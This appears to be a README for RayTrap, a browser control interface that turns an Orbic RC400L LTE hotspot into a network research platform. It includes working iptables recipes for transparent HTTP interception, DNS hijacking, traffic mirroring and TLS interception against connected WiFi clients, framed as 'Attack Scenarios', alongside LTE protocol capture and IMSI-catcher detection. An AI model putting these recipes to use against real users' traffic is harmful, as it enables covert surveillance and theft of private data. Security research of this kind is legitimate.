# RayTrap — Unified Web Control Interface

**Transparent WiFi MITM** · **Passive traffic mirroring** · **DNS hijacking** · **TLS intercept path** · **Full packet capture** · **LTE DIAG stream (RRC · NAS · L1–PDCP)** · **IMSI-catcher detection** · **Concurrent AP+STA dual uplink** · **Per-client LTE/WiFi policy routing** · **USB composition switching** · **Boot-persistent, browser-accessible, $30**

---

RayTrap is a browser-based control interface for the Orbic RC400L, turning a $30 LTE hotspot into a pocket-sized network research platform. Thirteen tabs expose every capability of the device over an ADB tunnel — no rootshell, no terminal, no external hardware beyond a USB cable.

Developed as part of the [RC400L research project](README.md). All underlying capabilities are documented step-by-step in the main README.

---

<!-- screenshots-updated: 2026-03-13 -->
<!-- AUTO-UPDATED: .github/workflows/screenshots.yml regenerates raytrap_demo.gif on every push touching www/ -->

![RayTrap UI — Dashboard · Firewall · Proxy · WiFi · Routing · Capture · System · AT Terminal · USB · Cell Intel · DNS Monitor · Probe Monitor · Captive Portal](assets/raytrap_demo.gif)

---

## What This Does

A $30 device, fully unlocked, running a boot-persistent web UI with:

| Capability | How |
|---|---|
| Transparent MITM of all WiFi clients | tinyproxy + iptables REDIRECT |
| Passive traffic duplication to Wireshark | iptables TEE — zero client footprint |
| Full packet capture on every interface | tcpdump with escaped capability jail |
| Intercept and log all HTTP requests | Proxy tab — inline log tail |
| DNS hijacking | iptables DNAT |
| TLS intercept path (TPROXY) | Kernel-level TPROXY rule with mitmproxy/sslsplit support |
| Concurrent WiFi AP + STA (bridge repeater) | wpa_supplicant on wlan1 alongside wlan0 AP |
| Per-client dual uplink (LTE or WiFi) | Policy routing tables 100/200 with MARK rules |
| Raw LTE protocol capture (RRC, NAS, L1–PDCP) | Rayhunter fork DIAG stream |
| IMSI-catcher heuristics | Rayhunter fork analyzers |
| USB composition switching (20 modes) | Sysfs gadget rewrite + DIAG serial toggle |

Everything is browser-accessible over `adb forward tcp:8889 tcp:8888`. No app. No driver. No cloud.

---

## Prerequisites

- **Rayhunter installed** — provides root access via `rootshell`. See [EFF Rayhunter](https://github.com/EFForg/rayhunter) for install.
- **ADB working** — `adb devices` shows the device as authorized.
- **Repo root** — all commands below assume you're running from the repo root.

---

## Deploy

```bash
# Push the package (Windows Git Bash)
adb push PortableApps/26_raytrap //data/tmp/raytrap

# Open a rootshell and run the installer
adb shell
rootshell
sh /data/tmp/raytrap/deploy.sh

# Clean up staging (non-root adb shell)
exit
adb shell rm -rf /data/tmp/raytrap
```

The deploy script:
1. Preflight: verifies root access, package completeness, and busybox httpd availability
2. Stops any existing httpd on port 8888
3. Installs `tinyproxy`, `tcpdump`, `libpcap.so.1` to `/cache/bin/` and `/cache/lib/`
4. Deploys the iptables daemon (`ipt_daemon.sh`, `ipt_ctl.sh`, `ipt_rules.sh`) to `/cache/ipt/` with inittab respawn entry, waits for FIFO
5. Rayhunter detection: probes existing binary for compatibility; installs bundled v0.10.2 (musl static armv7), replaces a crashing glibc build, or keeps an existing functional binary
6. Starts rayhunter via ipt daemon (required for `CAP_SYS_ADMIN`); creates default `config.toml` and installs `rayhunter_daemon` init script if missing
7. Verifies rayhunter startup via log inspection
8. Creates `/cache/raytrap/www/cgi-bin/` and `/cache/raytrap/captures/`
9. Installs all CGI scripts (chmod 755), `index.html`, `captive.html`, and `start.sh`
10. Installs `/etc/init.d/raytrap_daemon`
11. Patches `/etc/init.d/misc-daemon` to launch RayTrap at boot after modem ONLINE
12. Launches busybox httpd via inittab `once` entry, signals PID 1, waits for port 8888
13. Verifies port 8888 is listening
14. Removes temporary inittab entry
15. Final service verification: confirms httpd, ipt daemon, and rayhunter are all running

**Boot persistence**: RayTrap starts automatically on every subsequent reboot. The iptables daemon and rayhunter fork survive reboots via the same mechanism.

---

## Access

```bash
adb forward tcp:8889 tcp:8888
# Open:  http://127.0.0.1:8889/
```

```
┌──────────────────┐           ADB USB           ┌──────────────────────────────┐
│   Laptop / PC    │◄──────────────────────────►│   Orbic RC400L               │
│                  │                             │                              │
│  browser         │                             │  busybox httpd               │
│  :8889  ─────────┼── tcp:8889 → tcp:8888 ──────┼──► :8888                   │
│                  │                             │      │                       │
│  adb forward     │                             │  /cache/raytrap/www/         │
│  tcp:8889        │                             │  cgi-bin/*.cgi               │
│  tcp:8888        │                             │                              │
└──────────────────┘                             └──────────────────────────────┘
```

`status.cgi` polls 7–8 services on load — allow ~9 seconds for the Dashboard to fully populate over ADB tunnel.

---

## Tabs

### Dashboard

Live status poll every 15 seconds. Shows 🟢/🔴 indicators for:
- iptables daemon (`/cache/ipt/cmd.fifo` + `CapEff` capability check)
- tinyproxy (PID)
- wpa_supplicant on `wlan1` (connection state, SSID, IP)
- Active tcpdump capture (PID, interface, elapsed time)

System panel: uptime, `/cache` and `/data` free space, kernel version.

---

### Firewall

Add and delete rules in the `ORBIC_PREROUTING` (nat) and `ORBIC_MANGLE` chains without touching any QCMAP chain. QCMAP remains fully functional.

Five rule presets:

| Preset | Chain | Target | Use Case |
|---|---|---|---|
| Mirror (TEE) | mangle ORBIC_MANGLE | `TEE --gateway <IP>` | Passive Wireshark feed — no ARP poisoning, no client changes |
| Redirect Port | nat ORBIC_PREROUTING | `REDIRECT --to-ports <port>` | Transparent port hijack (e.g. port 80 → tinyproxy) |
| Forward to Host (DNAT) | nat ORBIC_PREROUTING | `DNAT --to-destination <IP:port>` | Redirect traffic to a different host — DNS, capture server, honeypot |
| Block Source | filter ORBIC_FILTER | `DROP` | Block a specific client IP or subnet |
| Mark Traffic | mangle ORBIC_MANGLE | `MARK --set-mark <val>` | Tag flows for policy routing on the Routing tab |

Active rules table shows all entries in `ORBIC_*` chains with type badges and per-rule delete buttons.

---

### Proxy

tinyproxy lifecycle control:
- **Start / Stop** — launches via inittab escape
- **Transparent HTTP** toggle — adds/removes the port 80 REDIRECT rule automatically
- **Config editor** — inline edit: port, log level, allow subnet, max clients, timeout
- **Log tail** — live last-30-lines of tinyproxy access log showing every proxied request

Default config: port 8118, log level `connect`, allow `192.168.1.0/24`.

**Transparent proxy flow:**

```
  Client request: GET http://example.com/ HTTP/1.1
                              │
  ┌─────────────────────────────────────────────────┐
  │ iptables nat ORBIC_PREROUTING                   │
  │ -p tcp --dport 80 -j REDIRECT --to-ports 8118  │
  └────────────────────────┬────────────────────────┘
                           │ port 80 → port 8118
                           ▼
  ┌─────────────────────────────────────────────────┐
  │ tinyproxy :8118                                 │
  │ logs: GET http://example.com/ from 192.168.1.x  │
  └────────────────────────┬────────────────────────┘
                           │ forwarded upstream
                           ▼
                    rmnet0 (LTE) → Internet
```

All URLs, hostnames, and request timing are visible in the log tail with no client configuration. The client has no indication their HTTP traffic is being intercepted.

---

### WiFi

wpa_supplicant STA management on `wlan1` (concurrent with `wlan0` AP):

- Connection state, current SSID, IP address, wpa_supplicant PID
- **Add Network** — SSID + passphrase, per-connection band selection (Auto / 2.4 GHz / 5 GHz)
- **Saved networks table** — per-row connect/remove buttons, current/saved status badges
- Raw `wpa_cli status` log panel

**AP band configuration**: separate control to switch the hosted AP between 2.4 GHz and 5 GHz (writes `wlan_conf_6174.xml`, sends SIGHUP to hostapd, effective on next AP restart).

**Scanning limitation**: passive channel scan returns empty while `wlan0` AP is active (radio can't go off-channel without disrupting AP clients). Enter the target SSID directly — the supplicant will associate when it hears the target beacon on the current channel.

**Dual-uplink topology:**

```
                              ┌──────────────────────────────┐
   WiFi Clients               │   Orbic RC400L               │
   192.168.1.x ──►  wlan0  ──►│                              │
                    bridge0   │  MARK rules (Routing tab)    │
                              │                              │
                              │  Table 100 (LTE)  ──────────►  rmnet0 ──► Internet (LTE)
                              │  Table 200 (WiFi) ──────────►  wlan1  ──► Upstream WiFi AP
                              │                              │
                              │  Per-client routing:         │
                              │  client A → table 100 (LTE)  │
                              │  client B → table 200 (WiFi) │
                              └──────────────────────────────┘
```

This topology lets you route specific clients through LTE while others exit through an upstream WiFi network — useful for A/B carrier comparison, split tunneling research, or routing a target device through a monitored LTE path while keeping your own traffic on WiFi.

---

### Routing

Policy routing control using `ip rule` and separate routing tables:

- **Table 100** — LTE uplink via `rmnet0`
- **Table 200** — WiFi STA uplink via `wlan1`
- **Initialize Routing Tables** button — populates both tables in one click
- **Per-client assignment** — route a specific client's traffic through either uplink using MARK rules

Requires iptables daemon running (for MARK injection) and wpa_supplicant associated on `wlan1` for table 200 to have a gateway route.

---

### Capture

tcpdump control with browser-based PCAP download:

- **Interface picker**: `bridge0`, `wlan0`, `rmnet0`, `wlan1`, `any`
- **BPF filter** text field — `port 53`, `host 192.168.1.50`, `not port 22`, etc.
- **Duration**: 30s / 60s / 5m / unlimited
- **Filename prefix**: optional label prepended to the capture filename
- Start / Stop / Refresh buttons
- Active capture: PID, interface, filename, elapsed time display
- Saved captures: file sizes + Download link (served as `Content-Disposition: attachment`)

```
Interface options:
  bridge0  — all WiFi client traffic (most common for hotspot research)
  wlan0    — 802.11 management frames + data before bridging
  rmnet0   — LTE uplink only (what leaves the device toward the carrier)
  wlan1    — upstream WiFi STA traffic (when wpa_supplicant is associated)
  any      — all interfaces simultaneously
```

---

### USB

USB composition switching and DIAG debug control:

- Lists all available USB compositions with their function strings (diag, serial, adb, rmnet, rndis, ecm, mbim)
- Live read of current active composition from sysfs
- **Set Mode** — writes to `/sys/class/android_usb/android0/` sysfs and persists to `/usrdata/mode.cfg`
- **DIAG Debug toggle** — enables/disables the Qualcomm USB DIAG serial interface without a full mode switch

Notable compositions:

| Mode | Functions | Use Case |
|---|---|---|
| 1 (f601) | diag + serial + adb + rmnet | Standard development mode |
| 9 (f622) | rndis + diag + serial + adb | Windows RNDIS + DIAG — QCSuper compatible |
| 19 (9085) | diag + adb + usb_mbim + gps | Windows-native MBIM modem, no driver needed |
| 20 (9025) | diag + serial + rmnet + adb | AT command access via serial |

Switching USB composition live avoids a reboot in most cases. Enabling RNDIS in the same composition as DIAG is the key configuration for running QCSuper while maintaining ADB access.

---

### DIAG Control

Rayhunter fork log mask and streaming control:

- 14 toggleable DIAG log categories with single-click enable/disable
- `enable_all` override
- **Set Owner** — toggle `/dev/diag` between rayhunter and external tools (mirrors Dashboard panel)
- Live rayhunter status: running, PID, port, fork stream availability, debug_mode

**Log categories:**

| Category | DIAG Codes | What It Captures |
|---|---|---|
| `lte_rrc` | 0xB0C0 | SIBs 1–13, RRC setup/release, measurement reports, handover, cell identity |
| `lte_nas` | 0xB0E2/B0E3/B0EC/B0ED | Attach/auth, TAU, PDN connectivity, GUTI, NAS security mode |
| `lte_l1` | 0xB17F/B11F/B180/B100/B101 | RSRP/RSRQ/SINR, neighbor scan, timing advance |
| `lte_mac` | 0xB063/B064/B065/B08A/B08B/B08C | HARQ, scheduling, buffer status reports |
| `lte_rlc` | 0xB086/B087/B088/B089 | PDU delivery, retransmission, sequence gaps |
| `lte_pdcp` | 0xB097/B098/B09A/B09B/B09C | Header compression, ciphering, integrity, SRB/DRB |
| `wcdma` | 0x412F | 3G RRC (active only when camped on WCDMA) |
| `gsm` | 0x512F/5226 | GSM BCCH/RR/MM/GMM (active only on 2G fallback) |
| `umts_nas` | 0x713A | 3G NAS: GMM/SM PDP context |
| `ip_data` | 0x11EB | Data call setup/teardown, PDN bearer |
| `nr_rrc` | 0xB821 | NR (5G NSA) RRC messages |
| `f3_debug` | (all F3) | Modem internal F3 trace messages |
| `qmi_events` | (QMI) | QMI service transactions and modem state events |

**Rayhunter fork additions** (see [SideQuests/Rayhunter_Fork.md](SideQuests/Rayhunter_Fork.md)):
- Boot mask: the fork applies the saved `[log_mask]` from `config.toml` at every startup regardless of `debug_mode`, ensuring the modem retains the selected logging configuration even when `/dev/diag` is handed off to external tools
- Stream API: `GET /api/stream` returns a chunked octet-stream of raw DIAG frames for piping to custom parsers

**Active analyzers** (rayhunter v0.10.2 + fork):
- IMSI/IMEI identity requested outside of normal attach flow
- Connection release with 2G redirect (forced downgrade)
- SIB 6/7 broadcast (2G/3G priority elevation)
- Null cipher (EEA0) negotiation
- NAS security mode null cipher request
- Incomplete SIB1 chain

---

## Attack Scenarios

### Transparent WiFi MITM

The simplest hotspot intercept. Connect any client to the Orbic AP. All their HTTP traffic flows through tinyproxy and is logged with hostname, path, and timing.

```
1. Proxy tab → Start tinyproxy → enable Transparent HTTP
2. Proxy tab → Log Tail shows every HTTP request in real time
3. Capture tab → interface bridge0 → Start → download PCAP for Wireshark
```

The client sees no certificate warning, no connection anomaly. HTTP/1.1 traffic is fully transparent. The proxy log tail updates live in the browser.

---

### Passive Traffic Mirror (Zero Client Footprint)

TEE duplicates packets at the kernel PREROUTING hook — no ARP poisoning, no routing change, no TCP reset. The client's traffic is unaffected. A copy of every packet arrives at your capture host.

```
1. Firewall tab → Mirror (TEE) → gateway = <your Wireshark host IP>
2. Start Wireshark on your Ethernet/WiFi interface facing the Orbic network
3. All client traffic appears in Wireshark without touching the client
```

This is useful when you cannot or do not want to modify the target device, or when you want to capture traffic from multiple clients simultaneously.

---

### DNS Hijacking

DNAT intercepts DNS queries before they leave the device and redirects them to a resolver you control.

```bash
# Redirect all UDP/53 to a custom resolver at 10.0.0.1:
sh /cache/ipt/ipt_ctl.sh iptables \
    -t nat -A ORBIC_PREROUTING \
    -i bridge0 -p udp --dport 53 \
    -j DNAT --to-destination 10.0.0.1:53
```

The custom resolver can be running on your laptop on the same subnet. Any DNS tool (dnsmasq, CoreDNS, Responder) can then respond to all client DNS queries. Combined with HTTP redirect, this allows full domain-based traffic steering.

---

### TLS Intercept Path

TPROXY routes HTTPS traffic to a local TLS proxy without revealing the redirect to the client at the TCP level. The client connects to the real destination IP but the kernel hands the socket to your proxy process.

```bash
# TPROXY HTTPS → local TLS proxy on port 8443:
sh /cache/ipt/ipt_ctl.sh iptables \
    -t mangle -A ORBIC_MANGLE \
    -i bridge0 -p tcp --dport 443 \
    -j TPROXY --on-port 8443 --tproxy-mark 1

sh /cache/ipt/ipt_ctl.sh ip rule add fwmark 1 lookup 100
sh /cache/ipt/ipt_ctl.sh ip route add local 0.0.0.0/0 dev lo table 100
```

Deploy a TLS MITM proxy (mitmproxy, sslsplit, bettercap) on port 8443 via the inittab escape for full socket capabilities. Custom CA cert must be installed on the target device, or target applications that don't perform certificate validation.

---

### LTE Cell Intelligence

Lock the modem to a specific cell to study it in isolation, or force a downgrade to characterize 2G/3G fallback behavior.

```
Cell Intel tab → view serving cell: MCC/MNC/eNB/CI/TAC/RSRP/RSRQ/SINR/band
```

Locking to a specific PCI/EARFCN and watching the DIAG stream (`lte_rrc` + `lte_nas` categories) shows the full attach and authentication exchange for that cell. If the cell requests IMSI instead of TMSI, or negotiates EEA0, rayhunter's analyzers flag it.

---

### Rogue Cell Site Detection

Rayhunter's analyzers run continuously against the DIAG stream. The DIAG Control tab shows the active log mask and rayhunter fork status. A capture session with `lte_rrc` + `lte_nas` enabled logs:

- Every identity request and whether it asked for IMSI or TMSI
- Every NAS security mode command and the cipher negotiated
- Every connection release with redirection target (2G forced handoff)
- Every SIB1 with incomplete follow-up SIB chain (truncated/minimal broadcast)

Historical captures are stored as QMDL files at `/data/rayhunter/qmdl/` with paired NDJSON analysis output. They can be pulled via ADB and decoded with QCSuper for deeper analysis.

---

### QCSuper — Protocol Layer Capture

QCSuper connects directly to the modem's DIAG interface via the USB Qualcomm HS-USB Diagnostics serial port (COM15 on Windows). This captures at the protocol layer below the IP stack — radio frames, NAS messages, RRC procedures, and modem internal events.

Requires: [QCSuper](https://github.com/P1sec/QCSuper) installed with Python venv and libusb. The device must be in a USB composition that exposes the DIAG interface (mode 9 or mode 1).

```bash
# From repo root (Windows Git Bash):
cd qcsuper
PATH="$PATH:venv/Lib/site-packages/libusb/_platform/windows/x86_64" \
  venv/Scripts/python qcsuper.py --usb-modem COM15 --info

# Live PCAP with NAS decryption:
PATH="$PATH:..." venv/Scripts/python qcsuper.py \
  --usb-modem COM15 --pcap-dump capture.pcap --decrypt-nas
```

Set the DIAG Owner to "External" in the DIAG Control tab before connecting — this ensures the rayhunter fork releases `/dev/diag` after applying the saved log mask, avoiding a conflict. The boot mask feature means QCSuper inherits a pre-configured log mask without needing to set it itself.

NAS capture (`lte_nas` category) requires an active SIM with network registration. The modem must be attached to a cell for NAS messages to be exchanged. RRC and L1 captures (SIBs, signal measurements, neighbor lists) work without a SIM — the modem scans and receives broadcast data regardless of SIM state.

---

## PCAP Workflows

### Path A — Capture Tab (File Download)

The simplest workflow. tcpdump writes to `/cache/raytrap/captures/` and you download when done.

1. **Firewall tab** → add Mirror (TEE) rule if you want WiFi client traffic (optional — skip for rmnet0 capture)
2. **Capture tab** → pick interface, enter BPF filter, set duration → **Start**
3. Wait for capture to complete (or click **Stop**)
4. Saved captures list → **Download** → file save dialog
5. Open in Wireshark on PC

### Path B — QCSuper Direct (DIAG Layer)

See QCSuper section above. Captures below IP — radio frames, NAS messages, RRC procedures.

### Path C — Rayhunter Fork Stream Endpoint

The rayhunter fork exposes raw DIAG frames as a chunked HTTP stream. Pipe to a custom parser or feed to tools that accept chunked octet-stream input.

```bash
# ADB forward rayhunter's port:
adb forward tcp:18080 tcp:8080

# Stream raw DIAG bytes:
curl -s http://127.0.0.1:18080/api/stream | hexdump -C | head -50

# Save to file for offline analysis:
curl -s http://127.0.0.1:18080/api/stream > diag_capture.bin
```

Rayhunter must be the DIAG owner (DIAG Control tab → "Set rayhunter as owner") for the stream to contain data.

---

## iptables Recipes

All rules are injected via the ipt daemon FIFO. They survive reboots. The Firewall tab handles the common cases — these are the raw commands for scripting.

**Syntax**: `sh /cache/ipt/ipt_ctl.sh iptables [args]` (or via Firewall tab).

### Mirror All WiFi Client Traffic (TEE)

```bash
sh /cache/ipt/ipt_ctl.sh iptables \
    -t mangle -A ORBIC_MANGLE \
    -i bridge0 \
    -j TEE --gateway 192.168.1.50
```

Replace `192.168.1.50` with your Wireshark host IP.

**Single client:**

```bash
sh /cache/ipt/ipt_ctl.sh iptables \
    -t mangle -A ORBIC_MANGLE \
    -i bridge0 -s 192.168.1.152 \
    -j TEE --gateway 192.168.1.50
```

### Transparent HTTP Redirect

```bash
sh /cache/ipt/ipt_ctl.sh iptables \
    -t nat -A ORBIC_PREROUTING \
    -i bridge0 -p tcp --dport 80 \
    -j REDIRECT --to-ports 8118
```

Manage this automatically via **Proxy tab → Transparent HTTP toggle**.

### DNAT to External Host

```bash
# Redirect client DNS to a custom resolver at 10.0.0.1:
sh /cache/ipt/ipt_ctl.sh iptables \
    -t nat -A ORBIC_PREROUTING \
    -i bridge0 -p udp --dport 53 \
    -j DNAT --to-destination 10.0.0.1:53
```

### TPROXY (TLS Interception)

```bash
sh /cache/ipt/ipt_ctl.sh iptables \
    -t mangle -A ORBIC_MANGLE \
    -i bridge0 -p tcp --dport 443 \
    -j TPROXY --on-port 8443 --tproxy-mark 1

sh /cache/ipt/ipt_ctl.sh ip rule add fwmark 1 lookup 100
sh /cache/ipt/ipt_ctl.sh ip route add local 0.0.0.0/0 dev lo table 100
```

Start a TLS MITM proxy on port 8443 via the inittab escape for full socket capabilities.

### Mark Traffic for Policy Routing

```bash
# Route client 192.168.1.152 through WiFi STA uplink (table 200):
sh /cache/ipt/ipt_ctl.sh iptables \
    -t mangle -A ORBIC_MANGLE \
    -i bridge0 -s 192.168.1.152 \
    -j MARK --set-mark 200

sh /cache/ipt/ipt_ctl.sh ip rule add fwmark 200 lookup 200
```

### View and Flush Rules

```bash
# View all ORBIC_* chain rules:
sh /cache/ipt/ipt_ctl.sh status

# Flush all ORBIC_* chains (keeps QCMAP rules intact):
sh /cache/ipt/ipt_ctl.sh flush

# Delete individual rule by number:
sh /cache/ipt/ipt_ctl.sh iptables -t mangle -D ORBIC_MANGLE 1
```

---

## Files

All source in `PortableApps/26_raytrap/`:

| File | Role |
|---|---|
| `deploy.sh` | One-step installer, run from rootshell |
| `raytrap/start.sh` | Manual start script (used by raytrap_daemon) |
| `raytrap/raytrap_daemon` | `/etc/init.d/` service script (start/stop/status) |
| `raytrap/tinyproxy` | HTTP proxy binary (ARM, glibc 2.22) |
| `raytrap/tcpdump` | Packet capture binary (ARM, static) |
| `raytrap/libpcap.so.1` | libpcap shared library |
| `raytrap/tinyproxy.conf` | Default tinyproxy configuration |
| `raytrap/www/index.html` | Single-page web UI (vanilla JS, no dependencies) |
| `raytrap/www/cgi-bin/status.cgi` | System overview, service PIDs, DIAG owner |
| `raytrap/www/cgi-bin/firewall.cgi` | ORBIC_* chain rule management |
| `raytrap/www/cgi-bin/proxy.cgi` | tinyproxy lifecycle + config + log tail |
| `raytrap/www/cgi-bin/wifi.cgi` | wpa_supplicant network management + AP band |
| `raytrap/www/cgi-bin/routing.cgi` | ip rule + policy routing tables |
| `raytrap/www/cgi-bin/capture.cgi` | tcpdump start/stop + PCAP download |
| `raytrap/www/cgi-bin/usb.cgi` | USB composition switch + DIAG debug toggle |
| `raytrap/www/cgi-bin/diag.cgi` | DIAG owner toggle, log mask, LTE control |

The Rayhunter fork patch (`PortableApps/26_raytrap/rayhunter_fork/daemon/src/main.rs`) seeds the DIAG log mask at every startup — documented in [SideQuests/Rayhunter_Fork.md](SideQuests/Rayhunter_Fork.md).

---

## Troubleshooting

**RayTrap not responding after deploy**

Check if httpd is running: `adb shell cat /proc/net/tcp6 | grep 22B8` (0x22B8 = port 8888). If absent, the inittab injection may have failed — rerun deploy.

**Dashboard loads but shows all services red**

`status.cgi` takes ~6–9 seconds over ADB tunnel. Wait, then refresh. If the iptables daemon shows red, verify `ls -la /cache/ipt/cmd.fifo` exists on device.

**Firewall rules not taking effect**

The iptables daemon must be running (green on Dashboard). Deploy `PortableApps/01_xtables/` separately if needed — that package installs the FIFO daemon that the Firewall tab uses.

**Transparent proxy not intercepting traffic**

Verify REDIRECT rule is active (Firewall tab → active rules table). Verify tinyproxy is running (Proxy tab → PID shown). Verify the client is connected to the Orbic hotspot.

**WiFi tab shows wpa_supplicant not running**

wpa_supplicant is deployed as part of `PortableApps/01_xtables/`. Check `ps | grep wpa_supplicant` from rootshell.

**PCAP download returns empty file**

Verify tcpdump has write access to `/cache/raytrap/captures/`. Run `ls -la /cache/raytrap/captures/` from rootshell.

**DIAG stream empty in QCSuper**

Ensure DIAG Owner is set to "External" on the DIAG Control tab. Verify the USB composition includes the DIAG function (mode 9 or mode 1). Check QCSuper's COM port matches the Qualcomm HS-USB Diagnostics device in Device Manager.
